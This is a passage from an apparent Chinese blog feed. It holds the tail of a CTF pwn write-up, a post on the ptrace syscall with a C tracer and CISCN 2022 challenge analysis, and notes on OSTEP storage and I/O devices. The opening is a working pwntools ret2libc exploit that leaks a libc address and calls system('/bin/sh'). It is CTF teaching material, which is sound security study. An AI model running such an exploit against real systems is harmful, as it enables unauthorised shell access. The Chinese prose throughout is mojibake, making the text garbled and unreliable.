: pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040119d : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401353 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401351 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040101a : ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># db(0x401211)</span></span><br><span class="line"><span class="comment"># db(0x040124B)</span></span><br><span class="line">db(<span class="number">0x0401241</span>)</span><br><span class="line"><span class="comment"># db(0x4012A3)</span></span><br><span class="line">sskd=<span class="number">0x04050A0</span></span><br><span class="line">pay=flat(</span><br><span class="line">        <span class="number">0x0000000000401353</span>,</span><br><span class="line">        elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        elf.sym[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">        <span class="number">0x0401264</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;in!\n&#x27;</span>,pay)</span><br><span class="line">sa(<span class="string">b&#x27;number&#x27;</span>,p32(<span class="number">0x12345678</span>))</span><br><span class="line">pay=cyclic(<span class="number">0x30</span>)+p64(sskd-<span class="number">8</span>) +p64(<span class="number">0x040124b</span>)</span><br><span class="line">sa(<span class="string">b&#x27;oLa&#x27;</span>,pay)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">pay=flat(</span><br><span class="line">         <span class="number">0x0000000000401353</span>,</span><br><span class="line">         bin_sh_addr,</span><br><span class="line">         system</span><br><span class="line">)</span><br><span class="line">sa(<span class="string">b&#x27;in!\n&#x27;</span>,pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é€è¿‡ä¸€é“pwné¢˜çœ‹ptraceç³»ç»Ÿè°ƒç”¨</title>
      <link href="/2023/10/14/2022-ciscn-syscall-ptrace/"/>
      <url>/2023/10/14/2022-ciscn-syscall-ptrace/</url>
      
        <content type="html"><![CDATA[<h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p>NBçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¸¸ç”¨çš„straceå’Œgdbéƒ½æ˜¯ç”¨ptraceå®ç°çš„</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid,</span></span><br><span class="line"><span class="params">            <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>å‚æ•°å¤æ‚ï¼Œå…¶ä»–å¯ä»¥æŸ¥æ‰‹å†Œ(man 2 ptrace)</p><blockquote><p>æ‰‹å†Œé‡Œï¼Œtracerå°±æ˜¯è°ƒè¯•ç¨‹åºï¼Œtraceeå°±æ˜¯è¢«è°ƒè¯•ç¨‹åºï¼Œè‹±è¯­ä¸€èˆ¬ç”¨-erå’Œ-eeæ¥è¡¨ç¤ºä¸»åŠ¨å’Œè¢«åŠ¨çš„å…³ç³»ï¼Œä¾‹å¦‚ï¼šemployerå°±æ˜¯è€æ¿ï¼Œemployeeå°±æ˜¯è‹¦é€¼çš„æ‰“å·¥äºº</p></blockquote><p><strong>request</strong>æŒ‡å®šè·Ÿè¸ªçš„åŠ¨ä½œ</p><p><em>PTRACE_TRACEME</em>ï¼šæ­¤è¿›ç¨‹å°†è¢«çˆ¶è¿›ç¨‹è·Ÿè¸ªï¼Œä»»ä½•ä¿¡å·ï¼ˆé™¤äº† <code>SIGKILL</code>ï¼‰éƒ½ä¼šæš‚åœå­è¿›ç¨‹ï¼Œæ¥ç€é˜»å¡äº <code>wait()</code> ç­‰å¾…çš„çˆ¶è¿›ç¨‹è¢«å”¤é†’ã€‚å­è¿›ç¨‹å†…éƒ¨å¯¹ <code>exec()</code> çš„è°ƒç”¨å°†å‘å‡º <code>SIGTRAP</code> ä¿¡å·ï¼Œè¿™å¯ä»¥è®©çˆ¶è¿›ç¨‹åœ¨å­è¿›ç¨‹æ–°ç¨‹åºå¼€å§‹è¿è¡Œä¹‹å‰å°±å®Œå…¨æ§åˆ¶å®ƒã€‚è¿”å›ä¿¡å·è¢«waitä¹‹ç±»å‡½æ•°æ•è·åˆ°åå¹¶ä¸æ˜¯ä¿¡å·çš„å€¼ï¼Œåº“æä¾›äº†å®å»è§£æè·å¾—ï¼Œ<code>man 2 wait</code>æŸ¥çœ‹ (see also strsignal(3))</p><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231014232059820.png" alt="image-20231014232059820"></p><p><em>PTRACE_ATTACH</em>: é™„åŠ åˆ°ä¸€ä¸ªæŒ‡å®šçš„è¿›ç¨‹ï¼Œä½¿å…¶æˆä¸ºå½“å‰è¿›ç¨‹è·Ÿè¸ªçš„å­è¿›ç¨‹ï¼Œè€Œå­è¿›ç¨‹çš„è¡Œä¸ºç­‰åŒäºå®ƒè¿›è¡Œäº†ä¸€æ¬¡ PTRACE_TRACEME æ“ä½œ</p><p><em>PTRACE_SYSCALL</em>: è°ƒè¯•è¿›ç¨‹æ¯æ¬¡è¿›å…¥æˆ–è€…é€€å‡ºç³»ç»Ÿè°ƒç”¨æ—¶éƒ½ä¼šè§¦å‘ä¸€æ¬¡<code>SIGTRAP</code>ä¿¡å·ï¼Œ</p><p><em>PTRACE_GETREGS</em>ï¼šè·å–é€šç”¨å¯„å­˜å™¨å€¼</p><p><em>PTRACE_SETREGS</em> : è®¾ç½®é€šç”¨å¯„å­˜å™¨å€¼</p><p><em>PTRACE_SINGLESTEP</em>ï¼šæ¯æ‰§è¡Œå®Œä¸€æ¬¡æŒ‡ä»¤ä¹‹åä¼šè§¦å‘ä¸€æ¬¡sigtrap,æ”¯æŒè·å–å½“å‰è¿›ç¨‹çš„å†…å­˜&#x2F;å¯„å­˜å™¨çŠ¶æ€ã€‚gdbçš„å•æ­¥æŒ‡ä»¤é€šè¿‡è¯¥é€‰é¡¹å®ç°ã€‚</p><ul><li>ç¡¬ä»¶å®ç°å•æ­¥:å¤„ç†å™¨æ”¯æŒå•æ­¥æ¨¡å¼(x86é€šè¿‡è®¾ç½®EFLAGSå¯„å­˜å™¨ç¬¬8ä½çš„TFæ ‡å¿—å®ç°)</li><li>è½¯ä»¶å®ç°å•æ­¥:æ¯æ¡æŒ‡ä»¤åé¢éƒ½æ’å…¥ä¸€æ¡æ–­ç‚¹æŒ‡ä»¤(x86 int3[0xccçƒ«çƒ«çƒ«])</li><li>æ–­ç‚¹çš„å®ç°å¯ä»¥åœ¨æŒ‡ä»¤å¤„æ’å…¥int3ï¼Œå½“è¢«è°ƒè¯•çš„ç¨‹åºè¿è¡Œåˆ°æ–­ç‚¹çš„æ—¶å€™ï¼Œäº§ç”ŸSIGTRAPä¿¡å·ï¼ŒæŠŠæŒ‡ä»¤ä½ç½®å’Œè°ƒè¯•å™¨ç»´æŠ¤çš„æ–­ç‚¹é›†åˆ(ä¸€èˆ¬ä¸ºé“¾è¡¨)æ¯”è¾ƒåˆ¤æ–­SIGTRAPæ˜¯å¦ç”±æ–­ç‚¹äº§ç”Ÿï¼ŒæŠŠåŸæ¥æŒ‡ä»¤æ¢å¤ï¼Œè®¾ç½®pcå¯„å­˜å™¨ï¼Œå°±å¯ä»¥ç»§ç»­</li></ul><p><em>PTRACE_CONT</em>ï¼šç»§ç»­è¿è¡Œä¹‹å‰åœæ­¢çš„å­è¿›ç¨‹ã€‚å¯åŒæ—¶å‘å­è¿›ç¨‹äº¤ä»˜æŒ‡å®šçš„ä¿¡å·(dataå‚æ•°ä¼ é€’)</p><p><strong>pid</strong>è¡¨ç¤ºè¦è·Ÿè¸ªçš„è¿›ç¨‹pid</p><p><strong>addr</strong>è¡¨ç¤ºè¿›ç¨‹çš„å†…å­˜åœ°å€</p><p><strong>data</strong> æ ¹æ®å‰é¢è®¾ç½®çš„requeté€‰é¡¹è€Œå˜åŒ–ï¼Œå­˜æ”¾è¯»å–å‡ºçš„æˆ–è€…è¦å†™å…¥çš„æ•°æ®</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="type">pid_t</span> child;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="type">int</span> orig_rax;</span><br><span class="line"></span><br><span class="line">  child = fork();</span><br><span class="line">  <span class="keyword">if</span> (child == <span class="number">0</span>) &#123;</span><br><span class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">//è¢«è°ƒè¯•</span></span><br><span class="line">    execl(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;/bin/ls&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    wait(&amp;status); <span class="comment">// æ¥æ”¶è¢«å­è¿›ç¨‹å‘é€è¿‡æ¥çš„ SIGTRAP ä¿¡å·</span></span><br><span class="line">    <span class="comment">//è¿™ä¸€æ¬¡æ˜¯execveç³»ç»Ÿè°ƒç”¨å¼•èµ·çš„ï¼Œè°ƒç”¨æˆåŠŸä¸è¿”å›</span></span><br><span class="line">    ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;orig_rax: %llx\t&quot;</span>, regs.orig_rax); <span class="comment">// æ‰“å°raxå¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax: %llx\n&quot;</span>, regs.rax);           <span class="comment">// æ‰“å°raxå¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// 1. å‘é€ PTRACE_SYSCALL å‘½ä»¤ç»™è¢«è·Ÿè¸ªè¿›ç¨‹</span></span><br><span class="line">      <span class="comment">// (è°ƒç”¨ç³»ç»Ÿè°ƒç”¨å‰ï¼Œå¯ä»¥è·å–ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°)</span></span><br><span class="line">      ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      wait(&amp;status); <span class="comment">// æ¥æ”¶è¢«å­è¿›ç¨‹å‘é€è¿‡æ¥çš„ SIGTRAP ä¿¡å·(è¿›å…¥ç³»ç»Ÿè°ƒç”¨è§¦å‘)</span></span><br><span class="line">      <span class="keyword">if</span> (WIFEXITED(status)) &#123; <span class="comment">// å¦‚æœå­è¿›ç¨‹é€€å‡ºäº†, é‚£ä¹ˆç»ˆæ­¢è·Ÿè¸ª</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;--------------&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, status);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); <span class="comment">// è·å–è¢«è·Ÿè¸ªè¿›ç¨‹å¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;orig_rax: %llx\t&quot;</span>, regs.orig_rax); <span class="comment">// æ‰“å°raxå¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;rax: %llx\t&quot;</span>, regs.rax);           <span class="comment">// æ‰“å°raxå¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">      <span class="comment">// 2. å‘é€ PTRACE_SYSCALL å‘½ä»¤ç»™è¢«è·Ÿè¸ªè¿›ç¨‹</span></span><br><span class="line">      <span class="comment">// (è°ƒç”¨ç³»ç»Ÿè°ƒç”¨åï¼Œå¯ä»¥è·å–ç³»ç»Ÿè°ƒç”¨çš„è¿”å›å€¼)</span></span><br><span class="line">      ptrace(PTRACE_SYSCALL, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">      wait(&amp;status); <span class="comment">// æ¥æ”¶è¢«å­è¿›ç¨‹å‘é€è¿‡æ¥çš„ SIGTRAP ä¿¡å·(ç³»ç»Ÿè°ƒç”¨è¿”å›è§¦å‘)</span></span><br><span class="line">      <span class="comment">//ç³»ç»Ÿè°ƒç”¨è¿”å›å€¼</span></span><br><span class="line">      ptrace(PTRACE_GETREGS, child, <span class="number">0</span>, &amp;regs); <span class="comment">// è·å–è¢«è·Ÿè¸ªè¿›ç¨‹å¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;orig_rax: %llx\t&quot;</span>, regs.orig_rax); <span class="comment">// æ‰“å°raxå¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;rax: %llx\n&quot;</span>, regs.rax);           <span class="comment">// æ‰“å°raxå¯„å­˜å™¨çš„å€¼</span></span><br><span class="line">      <span class="keyword">if</span> (WIFEXITED(status)) &#123; <span class="comment">// å¦‚æœå­è¿›ç¨‹é€€å‡ºäº†, é‚£ä¹ˆç»ˆæ­¢è·Ÿè¸ª</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;++++++++++++++++++++++&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, status);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231014223223759.png" alt="image-20231014223223759"></p><p>åŸºæœ¬ä¸Šå¯ä»¥å’Œstraceè¾“å‡ºç»“æœå¯¹ä¸Š</p><ul><li><a href="https://zhuanlan.zhihu.com/p/641501227">https://zhuanlan.zhihu.com/p/641501227</a></li><li><a href="https://www.cnblogs.com/heixiang/p/10988992.html">https://www.cnblogs.com/heixiang/p/10988992.html</a></li></ul><h2 id="ciscn2022-syscall"><a href="#ciscn2022-syscall" class="headerlink" title="ciscn2022 syscall"></a>ciscn2022 syscall</h2><p>é¦–å…ˆæ˜¯çˆ¶çº¿ç¨‹åˆ†æ”¯</p><p>é€šè¿‡<code>ptrace(PTRACE_GETREGS, (unsigned int)a1, 0LL, &amp;s);</code>å¯ä»¥åˆ¤æ–­å¤„sæ˜¯ä¸€ä¸ªuser_regs_structçš„ç»“æ„ä½“å®šä¹‰åœ¨<code>#include &lt;sys/user.h&gt;</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r15;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r14;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r13;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r12;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rbx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r11;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r10;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r9;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> r8;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rax;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rcx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdx;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rdi;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> orig_rax;<span class="comment">//ç³»ç»Ÿè°ƒç”¨å·å·</span></span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rip;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> cs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> eflags;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> rsp;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ss;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs_base;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ds;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> es;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> fs;</span><br><span class="line">  __extension__ <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ç»“æ„ä½“åä»£ç å°±æ¸…æ™°æ˜äº†å¤šäº†</p><p>é¦–å…ˆç¬¬ä¸€ä¸ªwaitpidè¢«å­çº¿ç¨‹é‡Œçš„<code>raise(18)</code>å”¤é†’</p><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231015011436298.png" alt="image-20231015011436298"></p><p>è¿™é‡Œåˆ¤æ–­ä½å­—èŠ‚ä¸º0x7fæ˜¯ä¸ºäº†åˆ¤æ–­å­çº¿ç¨‹æ˜¯å¦æ”¶å› ä¿¡å·ä¼ é€’è€Œåœæ­¢</p><p><img src="/2023/10/14/2022-ciscn-syscall-ptrace/image-20231015012226004.png" alt="image-20231015012226004"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> WIFSTOPPED(status)    __WIFSTOPPED (status)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    __WIFSTOPPED(status)(((status) &amp; 0xff) == 0x7f)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:35&amp;&amp;36&amp;&amp;37&amp;&amp;44 IOè®¾å¤‡</title>
      <link href="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/"/>
      <url>/2023/10/09/OSTEP-35-36-37-44-IO-Devices/</url>
      
        <content type="html"><![CDATA[<h2 id="å­˜å‚¨è®¾å¤‡"><a href="#å­˜å‚¨è®¾å¤‡" class="headerlink" title="å­˜å‚¨è®¾å¤‡"></a>å­˜å‚¨è®¾å¤‡</h2><p>è¯„ä»·æ–¹æ³•ï¼šä»·æ ¼ã€å®¹é‡ã€é€Ÿåº¦ã€å¯é æ€§</p><h3 id="å­˜å‚¨ä»‹è´¨ï¼šç£"><a href="#å­˜å‚¨ä»‹è´¨ï¼šç£" class="headerlink" title="å­˜å‚¨ä»‹è´¨ï¼šç£"></a>å­˜å‚¨ä»‹è´¨ï¼šç£</h3><p>ç£å¸¦â€“&gt;ç£ç›˜</p><h3 id="å­˜å‚¨ä»‹è´¨ï¼šå‘"><a href="#å­˜å‚¨ä»‹è´¨ï¼šå‘" class="headerlink" title="å­˜å‚¨ä»‹è´¨ï¼šå‘"></a>å­˜å‚¨ä»‹è´¨ï¼šå‘</h3><p>å…‰ç›˜Compact Disk</p><p>åˆ©ç”¨å‘æ¥é˜»ç¢å…‰çš„åå°„ï¼Œæœ‰äº†æ¯ç‰‡å¾ˆå®¹æ˜“é€šè¿‡ â€œå‹ç›˜â€ å¤åˆ¶äº§å“ï¼Œä½†æ˜¯åªè¯»(æŒ–å‘å®¹æ˜“å¡«å‘éš¾ï¼Œæš—ç¤ºæˆ‘ç»å¸¸æŒ–å‘ä¸å¡«?ğŸ˜¢)</p><h3 id="å­˜å‚¨ä»‹è´¨ï¼šç”µ"><a href="#å­˜å‚¨ä»‹è´¨ï¼šç”µ" class="headerlink" title="å­˜å‚¨ä»‹è´¨ï¼šç”µ"></a>å­˜å‚¨ä»‹è´¨ï¼šç”µ</h3><p>ä¹‹å‰çš„æŒä¹…å­˜å‚¨ä»‹è´¨æœ‰è‡´å‘½çš„ç¼ºé™·</p><ul><li>ç£ï¼šæœºæ¢°éƒ¨ä»¶å¯¼è‡´ ms çº§å»¶è¿Ÿ</li><li>å‘ (å…‰): ä¸€æ—¦æŒ–å‘ï¼Œå¡«å‘å¾ˆå›°éš¾ (CDæ˜¯åªè¯»çš„)</li></ul><p>Flash Memory â€œé—ªå­˜â€</p><ul><li>Floating gate çš„å……ç”µ&#x2F;æ”¾ç”µå®ç° 1-bit ä¿¡æ¯çš„å­˜å‚¨</li></ul><p><img src="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/image-20231009114124863.png" alt="image-20231009114124863"></p><p>é€Ÿåº¦å¿«ï¼Œå®¹é‡è¶Šå¤§ï¼Œé€Ÿåº¦è¶Šå¿« (ç”µè·¯çº§å¹¶è¡Œ)</p><p>è¡ç”Ÿå‡ºä¸€ç³»åˆ—äº§å“:Compact Flash(CFå¡ï¼Œå¯¹å°±æ˜¯mp3ä¸Šçš„é‚£ç§)â€“&gt;USB Flash Disk(Uç›˜)â€“&gt;Flash-based SSDs(solid-state storage device,å›ºæ€å­˜å‚¨è®¾å¤‡)</p><ul><li>å¬è¯´å›ºæ€æœ€è¿‘å¥½åƒä»·æ ¼å›å‡ï¼Œæˆ‘å¤§æ¦‚äº”æœˆä»½ä¹°çš„æ—¶å€™ä¸‰æ˜Ÿï¼Œè¥¿éƒ¨æ•°æ®è¿™æ ·çš„å¤§å‚éƒ½ä¾¿å®œçš„ç¦»è°±ï¼Œå¤šæ˜¯å½’åŠŸäºå›½äº§ssdæŠ€æœ¯çªç ´ï¼Œé•¿æ±ŸNB</li></ul><h4 id="å›ºæ€ç¡¬ç›˜éœ€è¦å…‹æœçš„é—®é¢˜"><a href="#å›ºæ€ç¡¬ç›˜éœ€è¦å…‹æœçš„é—®é¢˜" class="headerlink" title="å›ºæ€ç¡¬ç›˜éœ€è¦å…‹æœçš„é—®é¢˜"></a>å›ºæ€ç¡¬ç›˜éœ€è¦å…‹æœçš„é—®é¢˜</h4><p>ä¸€ä¸ªé—ªå­˜é¢è¢«åˆ†ä¸ºé—ªå­˜å—ï¼Œä¸€ä¸ªé—ªå­˜å—è¢«åˆ†ä¸ºé—ªå­˜é¡µï¼Œå¯¹äºè¯»æ¥è¯´æ­£å¸¸è¯»ä¸€ä¸ªé¡µï¼Œå†™æ¥è¯´éœ€è¦å°†é¡µæ‰€åœ¨çš„æ•´ä¸ªå—æ“¦é™¤ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬å›ºæ€è¯»æ¯”å†™æ…¢çš„åŸå› </p><p><strong>æœ€å¤§é—®é¢˜è¿˜æ˜¯æ”¾ç”µ (erase) åšä¸åˆ° 100% æ”¾å¹²å‡€</strong></p><ul><li>æ”¾ç”µæ•°åƒ&#x2F;æ•°ä¸‡æ¬¡ä»¥åï¼Œå°±å¥½åƒæ˜¯ â€œå……ç”µâ€ çŠ¶æ€äº†</li></ul><p>è§£å†³æ–¹æ¡ˆ:æ¯ä¸€ä¸ª SSD é‡Œéƒ½è—äº†ä¸€ä¸ªå®Œæ•´çš„è®¡ç®—æœºç³»ç»Ÿ</p><p><img src="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/image-20231009121357473.png" alt="image-20231009121357473"></p><p>FTL: Flash Translation Layer</p><p>ç»´æŠ¤è¿™é€»è¾‘å—åˆ°ç‰©ç†å—çš„ä¸€å¼ æ˜ å°„è¡¨: å¯¹äºé€»è¾‘å—çš„è¯»å†™è½¬åŒ–ä¸ºç‰©ç†å—çš„å†™ï¼Œå½“å‘ç°è¿™ä¸ªç‰©ç†å—è¢«è¯»å†™çš„æ¬¡æ•°å¯¹äºå¤§å¤šæ•°ç‰©ç†å—æ—¶ï¼Œå°†é€»è¾‘å—é‡æ–°æ˜ å°„åˆ°ä¸€ä¸ªè¯»å†™æ¬¡æ•°ç›¸å¯¹å°‘çš„ç‰©ç†å—ï¼Œä»è€Œç»´æŒä¸€ç§å¹³è¡¡å«åšWear Leveling</p><p><strong>å®‰å…¨é—®é¢˜</strong></p><p>FTLä¹Ÿå°±å¯ä»¥æä¾›ä¸€ç§é€»è¾‘ä¸Šçš„å¿«é€Ÿæ¸…é™¤ï¼Œå®é™…ä¸Šç‰©ç†å—æ²¡æœ‰è¢«æ¸…é™¤(å† å¸Œå“¥è¢«åŠ¨èººæª)ï¼Œæ¸…é™¤åç”¨åƒåœ¾æ•°æ®è¦†ç›–æˆ–è®¸å¯ä»¥é¿å…æ‚²å‰§ğŸ˜‚</p><h2 id="I-x2F-Oè®¾å¤‡"><a href="#I-x2F-Oè®¾å¤‡" class="headerlink" title="I&#x2F;Oè®¾å¤‡"></a>I&#x2F;Oè®¾å¤‡</h2><p>I&#x2F;O è®¾å¤‡ (CPU è§†è§’)ï¼šâ€œä¸€ä¸ªèƒ½ä¸ CPU äº¤æ¢æ•°æ®çš„æ¥å£&#x2F;æ§åˆ¶å™¨â€</p><p><img src="/2023/10/09/OSTEP-35-36-37-44-IO-Devices/image-20231009132407402.png" alt="image-20231009132407402"></p><p>é€šè¿‡æ¥å£æ¥ä¸ºä¸Šå±‚æä¾›æœåŠ¡ï¼Œæ“ä½œç³»ç»Ÿä¸éœ€è¦å…³å¿ƒè®¾å¤‡internalsä»¥åŠå†…éƒ¨æ€ä¹ˆå®ç°ï¼Œåªè¦æŒ‰ç…§è®¾å¤‡æ‰‹å†Œé€šè¿‡æ¥å£æ¥äº¤æµå³å¯(ç»™å¯„å­˜å™¨ä¸€ä¸ªå€¼ï¼Œè®¾å¤‡åšå‡ºç›¸åº”ååº”)</p><ul><li>CPU å¯ä»¥ç›´æ¥ä½¿ç”¨æŒ‡ä»¤ (in&#x2F;out&#x2F;MMIO) å’Œè®¾å¤‡äº¤æ¢æ•°æ®(MMIO(memory-mapped I&#x2F;O)ç”¨å†…å­˜æ˜ å°„çš„æ–¹å¼é€šè¿‡å†…å­˜åœ°å€å’Œè®¾å¤‡äº¤äº’)</li></ul><h3 id="æ€»çº¿"><a href="#æ€»çº¿" class="headerlink" 